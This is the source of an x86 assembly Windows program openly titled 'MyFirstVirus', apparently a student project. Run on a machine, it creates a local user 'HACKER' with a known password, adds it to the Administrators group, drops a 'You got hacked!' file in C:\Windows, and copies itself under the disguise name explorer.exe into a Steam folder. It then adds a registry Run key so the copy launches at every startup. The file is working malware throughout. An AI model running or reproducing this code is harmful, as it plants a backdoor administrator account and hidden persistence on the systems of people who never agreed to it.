TITLE MyFirstVirus(MyFirstVirus.asm)

; Description:	 Creates a username HACKER with the password HACKER on the local
;				 machine and adds it to the administrator group
; Authors:		 Ted Mader, Perabjoth Singh Bajwa
; Revision date: 12/3/2014

.386
.model flat, stdcall
option casemap : None
include windows.inc
include msvcrt.inc
includelib msvcrt.lib
includelib kernel32.lib
include kernel32.inc
include winextra.inc

system PROTO C, : DWORD
GetModuleFileNameA PROTO : dword, : dword, : dword

.data
command BYTE "cd \", 0
command1 BYTE "echo You just got hacked! >virus.txt",0
filename BYTE "C:\Windows\virus.txt",0
filehandle DWORD 0
buffer BYTE 261 DUP(0)
message BYTE "You got hacked!",0
path BYTE 512 DUP(?)
rename BYTE "C:\Games\Steam\SteamApps\common\explorer.exe",0
write DWORD 0
netuser BYTE "net user HACKER HACKER /add > null 2>&1",0
netadmin BYTE "net localgroup administrators HACKER /add > null 2>&1",0
regdata BYTE 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Explorer /d "C:\Games\Steam\SteamApps\common\explorer.exe"', 0

.code
main PROC
	push	NULL
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_NEW
	push	NULL
	push	FILE_SHARE_WRITE
	push	GENERIC_WRITE
	push	OFFSET filename
	call	CreateFile
	mov		filehandle,eax
	push	NULL
	push	NULL
	push	SIZEOF message
	push	OFFSET message
	push	filehandle
	call	WriteFile
	push	OFFSET netuser
	call	system
	push	OFFSET netadmin
	call	system
	INVOKE	GetModuleFileName,0,ADDR path,261
	push	FALSE
	push	OFFSET rename
	push	OFFSET path
	call	CopyFile
	push	OFFSET regdata
	call	system
	call	ExitProcess
main ENDP
END main